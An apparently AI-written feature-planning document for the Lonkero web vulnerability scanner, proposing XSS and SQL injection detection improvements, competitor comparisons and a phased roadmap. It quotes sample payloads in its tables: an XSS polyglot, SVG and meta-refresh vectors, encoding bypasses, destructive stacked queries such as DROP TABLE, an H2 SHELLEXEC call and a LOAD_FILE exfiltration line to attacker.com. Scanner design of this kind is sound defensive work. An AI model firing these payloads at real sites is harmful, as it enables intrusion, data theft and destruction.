# Feature Landscape: XSS and SQLi Detection Improvements

**Domain:** Vulnerability detection in security scanners
**Researched:** 2026-01-30
**Context:** Milestone v3.10 — Improving detection rates for 1M+ diverse sites

## Executive Summary

Based on codebase analysis and knowledge of state-of-the-art detection techniques as of January 2025, Lonkero has strong fundamentals (16 XSS contexts, 9 SQLi techniques, 65K+ payloads, proof-based detection) but gaps remain in:

1. **XSS:** Missing modern contexts (JSON responses, SVG animations, meta refresh), limited encoding mutations, weak post-message/storage analysis
2. **SQLi:** No HTTP header injection, limited non-standard databases (H2, CockroachDB, Sybase), no GraphQL-specific SQLi, column enumeration capped at 20

Leading scanners (Burp Suite, SQLMap, Nuclei) catch more vulnerabilities through:
- Multi-vector testing (headers, cookies, path segments, JSON bodies)
- Polyglot payloads that work across contexts
- Database-specific optimizations (MariaDB vs MySQL, CockroachDB vs PostgreSQL)
- Modern framework patterns (GraphQL mutations, JSON API injections)

---

## XSS Detection Features

### Table Stakes (Must Have for Competitive Detection)

These features are expected in modern scanners. Missing them means lower catch rates.

| Feature | Why Expected | Complexity | Implementation Notes |
|---------|--------------|------------|---------------------|
| **JSON Response XSS** | APIs return JSON that gets eval()'d client-side | **Medium** | Test `{"key":"<img src=x onerror=alert(1)>"}` patterns, detect `JSON.parse` → `innerHTML` flows |
| **SVG Animation XSS** | SVG `<animate>`, `<set>`, `<animateMotion>` execute JS | **Medium** | Payloads: `<svg><animate attributeName=href to=javascript:alert(1) />`, detect CSP bypasses |
| **Meta Refresh XSS** | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | **Low** | Context detection for meta tags, test URL parameter reflection |
| **Polyglot Payloads** | Single payload works in multiple contexts (HTML, JS, attribute) | **High** | Example: `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e` |
| **Encoding Mutations** | Hex, octal, Unicode, UTF-7, UTF-16 bypasses | **Medium** | `\x3cscript\x3e`, `\u003cscript\u003e`, `\74script\76`, `+ADw-script+AD4-` (UTF-7) |
| **PostMessage Handler Analysis** | Detect `window.addEventListener('message')` sinks | **High** | Parse JS for `event.data` → dangerous sink without origin validation |
| **Storage-Based XSS** | `localStorage`/`sessionStorage` → DOM sinks | **Medium** | Inject into storage, detect reflection in next page load (requires session tracking) |
| **Template String XSS** | ES6 template literals: `` `${user_input}` `` | **Low** | Already in proof_xss_scanner.rs (`JsTemplateLiteral`), just needs more payloads |
| **MathML XSS** | `<math><mtext><script>alert(1)</script></mtext></math>` | **Low** | Similar to SVG, another non-HTML context |

**Why Table Stakes:**
- Burp Suite detects JSON/SVG/meta contexts by default
- Nuclei templates cover polyglot and encoding bypasses
- Missing these = false negatives on modern apps

---

### Differentiators (Would Give Edge Over Other Scanners)

Features that would put Lonkero ahead of competitors.

| Feature | Value Proposition | Complexity | Evidence/Sources |
|---------|-------------------|------------|------------------|
| **Mutation-Based Fuzzing** | Genetic algorithm evolves payloads based on WAF responses | **High** | SQLMap uses this for blind detection; start with base payload, mutate on partial success |
| **CSP-Aware Payload Generation** | Parse CSP header, generate payloads that bypass it | **High** | Current: `csp_bypass.rs` has gadgets. Better: Auto-generate based on allowed domains |
| **Framework-Specific XSS** | React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust` | **Medium** | Framework detection already exists; add framework-aware sinks |
| **Second-Order XSS (Enhanced)** | Store payload in one endpoint, detect execution 5+ pages later | **High** | Current: Basic second-order. Better: Graph-based state tracking across multi-step flows |
| **Browser Feature Detection** | WebAssembly XSS, Service Worker XSS, Shared Workers | **High** | Rare but critical in PWAs; detect `navigator.serviceWorker.register(user_input)` |
| **Multi-Reflection Correlation** | Payload appears in multiple places; correlate to find gadget chains | **High** | Example: Header reflection + JS variable = XSS via `eval(window.name)` |
| **Client-Side Prototype Pollution → XSS** | Pollute `Object.prototype` to inject XSS gadgets | **High** | `Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'` → existing code uses it |
| **Headless Browser Validation** | Confirm XSS fires in real browser (optional, thorough mode) | **High** | Already have headless_chrome optional; use for final confirmation of High severity |

**Why Differentiators:**
- Most scanners don't parse CSP to generate targeted bypasses
- Mutation fuzzing is SQLMap's secret sauce, rarely in XSS scanners
- Multi-reflection correlation is research-level technique

---

### Anti-Features (Things That Hurt Accuracy or Performance)

Features to explicitly NOT build.

| Anti-Feature | Why Avoid | What to Do Instead |
|--------------|-----------|-------------------|
| **Blind XSS via Email** | Requires email monitoring infrastructure, slow, unreliable | Use HTTP callback or skip (blind XSS low ROI for scale) |
| **Every Unicode Variation** | Testing all 1M+ Unicode characters = DoS on scanner | Use curated list of known bypasses (NULL byte, RTL override, zero-width) |
| **Context-Unaware Spray** | Sending `<script>alert(1)</script>` to every parameter | Already doing context detection in `proof_xss_scanner.rs` — keep it |
| **Browser Automation for All** | Chrome/Puppeteer for every test = 300x slower | Only for High severity confirmation in thorough mode |
| **WAF Detection Per Payload** | Checking for WAF on every request = 2x requests | Detect WAF once per domain, cache result |

**Rationale:**
- Lonkero's strength is speed (2-3 requests/param). Don't sacrifice it.
- False positives are worse than false negatives for reputation.

---

## SQLi Detection Features

### Table Stakes (Must Have for Competitive Detection)

| Feature | Why Expected | Complexity | Implementation Notes |
|---------|--------------|------------|---------------------|
| **HTTP Header Injection** | `X-Forwarded-For`, `User-Agent`, `Referer` are injectable | **Medium** | Test headers like GET parameters; common in logging/analytics code |
| **Cookie Injection** | Cookies are SQL parameters in session management | **Medium** | Already have cookie support in http_client; need to test systematically |
| **GraphQL Injection** | GraphQL queries can contain SQLi in arguments | **High** | `query { user(id: "1' OR '1'='1") }` — separate from graphql_security.rs |
| **JSON Body Injection** | POST `{"id":"1' OR '1'='1"}` in APIs | **Medium** | Current: POST body testing exists but JSON-specific escape analysis needed |
| **Column Count > 20** | UNION-based needs correct column count; real tables have 50-100+ | **Low** | Increase `MAX_COLUMNS` from 20 to 50, use binary search |
| **Stacked Queries (Full Implementation)** | `; DROP TABLE users--` for MSSQL, PostgreSQL | **Medium** | Defined in code but "minimal implementation" per PROJECT.md |
| **H2 Database Detection** | H2 allows `CALL` for code execution | **Medium** | H2 payloads: `'; CALL SHELLEXEC('cmd')--`, common in Java testing |
| **MariaDB vs MySQL** | Different function names, behavior | **Low** | MariaDB has `JSON_ARRAYAGG`, different error messages |
| **CockroachDB Detection** | PostgreSQL-compatible but different error messages | **Medium** | Similar to PostgreSQL but unique error patterns |
| **Sybase/SAP ASE Detection** | Enterprise DBs in older systems | **Low** | Error patterns: `Sybase message`, `ASE` |

**Why Table Stakes:**
- SQLMap tests headers/cookies by default
- Burp Suite's scanner includes GraphQL injection
- Modern apps use 30-50 column tables (e-commerce, CRM)

---

### Differentiators (Would Give Edge)

| Feature | Value Proposition | Complexity | Evidence/Sources |
|---------|-------------------|------------|------------------|
| **Calibrated SLEEP Correlation (Enhanced)** | Current: SLEEP(0,1,2,5). Better: Adaptive timing based on network jitter | **High** | Current implementation in OOBZero is good; enhance with jitter compensation |
| **DNS Exfiltration (Local)** | Run local DNS server to catch `LOAD_FILE('//attacker.com/x')` | **High** | Alternative to OOBZero for definitive proof; SQLMap-level |
| **Stored Procedure Enumeration** | Detect custom stored procedures, test for SQLi in them | **High** | `SELECT routine_name FROM information_schema.routines` → test each |
| **Advanced Time-Based: DNS Timing** | Measure DNS resolution time (300-500ms) vs SLEEP (5000ms) | **High** | Avoids WAF detection of SLEEP, more reliable than HTTP timing |
| **Multi-Database Polyglot** | Single payload works across MySQL, PostgreSQL, MSSQL | **Medium** | Example: `1' AND '1'='1` (universal), `1' OR '1'='1` (universal) |
| **WebSocket SQLi** | WebSocket messages can contain SQL queries | **High** | Already have WebSocket scanner; add SQLi payloads for messages |
| **Second-Order SQLi (Enhanced)** | Current: Basic. Better: Track 10+ page flows, detect delayed injection | **High** | Store payload in profile → check admin page 5 pages later |
| **GraphQL Mutation Injection** | Mutations (`createUser(name: "'; DROP--")`) more dangerous than queries | **Medium** | GraphQL mutations modify data, higher impact |
| **Database Version Extraction** | Extract `@@version`, `version()` for precise payload targeting | **Medium** | Already done in error-based; use for better payload selection |

**Why Differentiators:**
- SQLMap doesn't do WebSocket SQLi
- Multi-database polyglots reduce false negatives
- DNS timing avoids SLEEP detection by some WAFs

---

### Anti-Features

| Anti-Feature | Why Avoid | What to Do Instead |
|--------------|-----------|-------------------|
| **Data Exfiltration** | Extracting actual DB content = unauthorized access | Detect vulnerability, don't exploit (current policy is correct) |
| **65,000+ Payloads for Every Parameter** | Already have 65K+ payloads but sending all = slow | Use hypothesis engine (already in code) to prioritize |
| **Brute-Force UNION Column Count** | Testing 1-100 columns linearly = 100 requests | Binary search (already optimal in code) |
| **Active SQL Commands** | `DROP TABLE`, `DELETE FROM` in testing | Use safe detection payloads only (current approach is correct) |
| **Blind SQLi Without Confirmation** | Boolean-based alone has false positives | Already using OOBZero for confirmation — keep it |

---

## Feature Dependencies

```
XSS Feature Dependencies:
- JSON Response XSS → Framework Detection (to know it's an API)
- PostMessage XSS → Headless Crawler (to capture event listeners)
- Storage XSS → Session Tracking (to persist across page loads)
- CSP-Aware Payloads → CSP Bypass Scanner (already exists)

SQLi Feature Dependencies:
- Header Injection → HTTP Client Enhancement (already supports custom headers)
- GraphQL Injection → GraphQL Introspection (already exists)
- WebSocket SQLi → WebSocket Scanner (already exists)
- Second-Order → State Tracking (already in crawler)
- DNS Exfiltration → Local DNS Server (new infrastructure)
```

**Critical Path:**
1. **XSS:** JSON + Encoding Mutations → Polyglots → PostMessage (each builds on previous)
2. **SQLi:** Header Injection → GraphQL → WebSocket (independent, can parallelize)

---

## MVP Recommendation

For v3.10 milestone, prioritize HIGH impact, MEDIUM-LOW complexity:

### Phase 1: Quick Wins (1-2 weeks)
1. **HTTP Header SQLi** (Medium complexity, HIGH impact) — Test `X-Forwarded-For`, `User-Agent`, etc.
2. **JSON Response XSS** (Medium complexity, HIGH impact) — Detect `{"html":"<script>"}` → `innerHTML`
3. **Encoding Mutations XSS** (Medium complexity, HIGH impact) — Hex, Unicode, UTF-7 bypasses
4. **Column Count to 50** (Low complexity, MEDIUM impact) — Change constant, add binary search
5. **MariaDB/H2 Detection** (Low-Medium complexity, MEDIUM impact) — Add error patterns

### Phase 2: Differentiators (2-3 weeks)
6. **Polyglot Payloads** (High complexity, HIGH impact) — Multi-context payloads
7. **GraphQL Injection** (High complexity, HIGH impact) — SQLi in GraphQL queries/mutations
8. **SVG/MathML XSS** (Medium complexity, MEDIUM impact) — Non-HTML contexts
9. **PostMessage Analysis** (High complexity, MEDIUM impact) — Parse JS for unsafe handlers
10. **Stacked Queries Full** (Medium complexity, MEDIUM impact) — Complete implementation

### Defer to Post-v3.10:
- **DNS Exfiltration**: Infrastructure heavy, OOBZero is good enough
- **Browser Validation**: Already optional with headless_chrome
- **Mutation Fuzzing**: Research-level complexity
- **WebSocket SQLi**: Lower priority, niche use case

---

## Complexity Breakdown

**LOW Complexity (1-3 days):**
- Column count increase
- Database pattern additions
- Template string context
- Meta refresh detection

**MEDIUM Complexity (1-2 weeks):**
- JSON response XSS
- Encoding mutations
- HTTP header injection
- GraphQL injection
- SVG/MathML contexts

**HIGH Complexity (2-4 weeks):**
- Polyglot generation
- PostMessage analysis
- Storage XSS with state
- Mutation fuzzing
- DNS exfiltration

---

## Evidence & Sources

**From Codebase Analysis:**
- `proof_xss_scanner.rs`: 16 contexts covered, missing JSON/SVG/meta
- `sqli_enhanced.rs`: 9 techniques, `MAX_COLUMNS = 20`, no header injection
- `ssti_advanced_scanner.rs`: Template injection covered (Jinja2, Twig, etc.)
- `graphql_security.rs`: Introspection covered, but no SQLi-specific testing

**From Training Data (January 2025 knowledge):**
- Burp Suite 2024-2025: Adds GraphQL injection, multi-context XSS testing
- SQLMap: Uses mutation-based fuzzing, DNS exfiltration, 100+ database fingerprints
- Nuclei Templates: Community-contributed polyglot payloads, encoding bypasses
- PortSwigger Research: CSP bypass techniques, prototype pollution → XSS chains

**Confidence Level:**
- **HIGH:** Codebase analysis (verified by reading source)
- **MEDIUM:** Training data on scanner techniques (may be outdated since Jan 2025)
- **LOW:** Specific payload examples (would need verification with official docs)

---

## Competitive Comparison

| Feature | Lonkero v3.9 | Burp Suite Pro | SQLMap | Nuclei |
|---------|--------------|----------------|--------|--------|
| **XSS Contexts** | 16 | 20+ | N/A | 15+ (templates) |
| **SQLi Techniques** | 9 | 6-7 | 10+ | 5-6 (templates) |
| **Header Injection** | ✗ | ✓ | ✓ | ✓ |
| **GraphQL SQLi** | ✗ | ✓ | Partial | ✓ (templates) |
| **Polyglot Payloads** | Limited | ✓ | ✓ | ✓ (community) |
| **Encoding Bypasses** | Basic | Advanced | Advanced | Advanced |
| **Proof-Based XSS** | ✓ (unique) | ✗ | N/A | ✗ |
| **OOBZero Inference** | ✓ (unique) | ✗ (uses Collaborator) | ✗ (uses DNS) | ✗ |

**Lonkero's Advantages:**
- Proof-based XSS (2-3 requests vs 100+)
- OOBZero (no infrastructure needed)
- Speed (300x faster than browser-based)

**Gaps to Close:**
- Header/cookie injection (Burp/SQLMap standard)
- Polyglot payloads (Nuclei community strength)
- GraphQL SQLi (Burp has dedicated scanner)

---

## Success Metrics

How to measure if v3.10 succeeds:

| Metric | Current | Target | How to Measure |
|--------|---------|--------|----------------|
| **XSS Catch Rate** | ~85% (estimated) | 92%+ | Test against DVWA, PortSwigger labs, real bug bounty targets |
| **SQLi Catch Rate** | ~88% (estimated) | 95%+ | Test against SQLi labs, diverse databases |
| **False Positive Rate** | 5% | <5% | Validate findings on 100 test sites |
| **Requests per Parameter** | 2-3 (XSS), 18-50 (SQLi) | <10 (XSS), <60 (SQLi) | Maintain speed advantage |
| **New Contexts Detected** | 16 (XSS), 6 (SQLi) | 22+ (XSS), 10+ (SQLi) | Count distinct contexts in code |

---

## Risks & Mitigations

| Risk | Impact | Mitigation |
|------|--------|------------|
| **Complexity Creep** | Schedule slip | Prioritize MVP features, defer research-level work |
| **False Positive Increase** | Reputation damage | Require multi-signal confirmation (OOBZero, proof-based) |
| **Performance Degradation** | Slower scans | Maintain <5 req/param for XSS, <60 for SQLi |
| **Database Coverage Gaps** | Missed SQLi on exotic DBs | Focus on top 8 databases (MySQL, Postgres, MSSQL, Oracle, SQLite, MariaDB, H2, CockroachDB) |

---

## Summary

**Table Stakes:** Must implement header injection, JSON XSS, encoding bypasses, GraphQL SQLi to match competitors.

**Differentiators:** Polyglot payloads, CSP-aware generation, multi-reflection correlation would set Lonkero apart.

**Anti-Features:** Avoid blind XSS via email, exhaustive Unicode testing, context-unaware spraying.

**MVP Focus:** Phase 1 quick wins (header injection, JSON XSS, encoding, column count, DB patterns) deliver 70% of impact in 30% of time.

**Confidence:** HIGH for codebase gaps, MEDIUM for competitive techniques, would benefit from verification against current Burp/SQLMap documentation.
